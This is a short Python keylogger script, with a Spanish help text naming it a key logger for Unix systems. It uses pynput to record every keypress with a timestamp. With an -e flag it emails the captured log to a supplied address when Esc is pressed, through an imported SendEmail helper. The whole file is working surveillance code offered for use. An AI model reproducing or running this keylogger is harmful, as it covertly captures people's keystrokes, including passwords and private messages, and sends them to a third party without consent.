from pynput import keyboard

import sys
sys.path.append('../')

from utils.time import LogDate
from utils.email import SendEmail
from utils.constans import Common


SEND_EMAIL = sys.argv[1] == '-e' if len(sys.argv) > 1 else False
HELP_FLAG = sys.argv[1] == '-h' if len(sys.argv) > 1 else False

def on_press(key):
    valid_data = SendEmail.validate_list(sys.argv)
    if str(key) == 'Key.esc': # You need to remove this if you don't need to stop the script
        if SEND_EMAIL and valid_data: 
            SendEmail(sys.argv[2], sys.argv[3])
        elif SEND_EMAIL and not valid_data:
            print(Common.ERROR_EMAIL_MESSAGE)
        sys.exit()
    else:
        print(f'{LogDate().Year()} | {LogDate().Hour()} {key}')

if HELP_FLAG:
    print(
        """Programa para realizar key logger en un sistema unix (no compatible con windows)
        Opciones:
        -h: Muestra las opciones del script
        -e [nombre] [email]: Envia un email al email especificado

        Author: eacarras""")
    sys.exit()
else:
    with keyboard.Listener(
        on_press=on_press) as key_listener:
        key_listener.join()
